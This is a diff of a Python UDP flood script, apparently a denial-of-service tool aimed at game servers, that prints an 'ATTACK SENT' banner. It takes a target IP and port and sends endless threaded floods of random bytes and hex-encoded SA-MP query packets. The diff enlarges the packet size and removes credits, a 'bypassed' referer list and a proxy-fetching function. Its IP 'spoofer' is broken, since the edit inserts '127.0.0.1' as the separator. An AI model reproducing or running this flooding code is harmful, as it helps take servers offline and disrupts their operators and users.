@@ -1,7 +1,6 @@
 import socket, struct, codecs, sys, threading, random, time, os
 ip = sys.argv[1]
 port = sys.argv[2]
-orgip = ip
 Pacotes = [
  codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),
  codecs.decode('53414d509538e1a9611e63', 'hex_codec'),
@@ -13,55 +12,18 @@ Pacotes = [
  codecs.decode('021efd40', 'hex_codec'),
  codecs.decode('081e7eda', 'hex_codec')]
 
-referers = [
-     'Your_Server_Bypassed_By_XXBR',
-     'Your_Server_Bypassed_By_XXBR',
-     'Your_Server_Bypassed_By_XXBR',
-     'Your_Server_Bypassed_By_XXBR',
-     'Your_Server_Bypassed_By_XXBR',
-     'Your_Server_Bypassed_By_XXBR',
-     'Your_Server_Bypassed_By_XXBR',
-     'Your_Server_Bypassed_By_XXBR',
-     'Your_Server_Bypassed_By_XXBR',
-     'Your_Server_Bypassed_By_XXBR',
-     'Your_Server_Bypassed_By_XXBR',
-     'Your_Server_Bypassed_By_XXBR',
-     'Your_Server_Bypassed_By_XXBR',
-     'Your_Server_Bypassed_By_XXBR',
-     'Your_Server_Bypassed_By_XXBR',
-     'Your_Server_Bypassed_By_XXBR',
-     'Your_Server_Bypassed_By_XXBR',
-     'Your_Server_Bypassed_By_XXBR',
-     'Your_Server_Bypassed_By_XXBR',
-     'Your_Server_Bypassed_By_XXBR',
-     'Your_Server_Bypassed_By_XXBR',
-     'Your_Server_Bypassed_By_XXBR',
-     'Your_Server_Bypassed_By_XXBR',
-     'Your_Server_Bypassed_By_XXBR'
-     'Your_Server_Bypassed_By_XXBR'
-     'Your_Server_Bypassed_By_XXBR',
-     'Your_Server_Bypassed_By_XXBR',
-     'Your_Server_Bypassed_By_XXBR',
-     'Your_Server_Bypassed_By_XXBR',
-     'Your_Server_Bypassed_By_XXBR',
-     'Your_Server_Bypassed_By_XXBR'
-     'Your_Server_Bypassed_By_XXBR']
-
 os.system("clear")
 print ("\033[35m                      ╔════════════════════════════════════╗")
 print ("\033[35m                      ║\033[31m  ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗\033[35m  ║")
 print ("\033[35m                      ║\033[31m  ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ \033[35m  ║")
 print ("\033[35m                      ║\033[31m  ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ \033[35m  ║")
 print ("\033[35m                      ╚════════════════════════════════════╝")
-print ("\033[31m                   ╔════════════════════╦══════════════════════╗")                 
-print ("\033[31m                   ║\033[32m TOOLS BY XXBR     \033[31m ║ \033[32m  REMAKE CODES BY SANZO   \033[31m║")
-print ("\033[31m                   ╚═══════════════════╦╩╦═════════════════════╝")
 print ("\033[31m             ATTACK TO IP \033[36m%s \033[31m║ ║\033[31m  AND ATTACK TO PORT \033[36m%s"%(ip,port))                                    
 
 
 def spoofer():
     addr = [192, 168, 0, 1]
-    d = '.'
+    d = '127.0.0.1'
     addr[0] = str(random.randrange(11, 197))
     addr[1] = str(random.randrange(0, 255))
     addr[2] = str(random.randrange(0, 255))
@@ -71,21 +33,13 @@ def spoofer():
     addr[6] = str(random.randrange(2, 256))
     assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3] + d + addr[4] + d + addr[5] + d + addr[6]
     return assemebled
-
-def getproxy():
-    global proxies
-    f = open(f'{nprox}.txt','wb')
-    r = requests.get(urlproxy)
-    f.write(r.content)
-    f.close()
-    proxies = open(f'{nprox}.txt').readlines()
-
+   
 class MyThread(threading.Thread):
 
     def run(self):
         while True:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            bytes = random._urandom(1081)
+            bytes = random._urandom(56324)
             pack = random._urandom(666)
             msg = Pacotes[random.randrange(0, 1)]
             sock.sendto(bytes, (ip, int(port)))
@@ -110,10 +64,3 @@ if __name__ == '__main__':
 
     except KeyboardInterrupt:
         os.system('cls' if os.name == 'nt' else 'clear')
-        print ("╔════════════════════════════════════╗")
-        print ("         ╔═╗╔╦╗╔═╗╔═╗╔═╗╔═╗╔╦╗        ")
-        print ("         ╚═╗ ║ ║ ║╠═╝╠═╝║╣  ║║        ")
-        print ("         ╚═╝ ╩ ╚═╝╩  ╩  ╚═╝═╩╝        ")
-        print ("╚════════════════════════════════════╝")
-        print ('\n\n')
-        print ('STOP TO ATTACK {}').format(orgip)
